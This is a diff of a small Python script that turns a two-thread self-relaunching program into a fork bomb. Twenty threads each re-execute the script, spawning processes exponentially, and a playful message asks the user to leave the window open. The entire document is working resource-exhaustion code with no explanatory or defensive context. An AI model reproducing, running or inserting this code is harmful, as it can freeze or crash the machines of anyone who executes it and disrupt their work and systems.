@@ -1,15 +1,14 @@
 import subprocess
-import sys
 import threading
+import sys
 
-def runProcess():
-    subprocess.check_call([sys.executable] + sys.argv)
+sys.stdout.write("\nHi hello please leave me open thanks :3")
+sys.stdout.flush()
 
-thread1 = threading.Thread(target=runProcess)
-thread2 = threading.Thread(target=runProcess)
+def runSelf():
+	subprocess.check_call([sys.executable] + sys.argv)
 
-thread1.start()
-thread2.start()
+threads = [threading.Thread(target=runSelf) for _ in range(20)]
 
-thread1.join()
-thread2.join()
+for thread in threads:
+    thread.start()
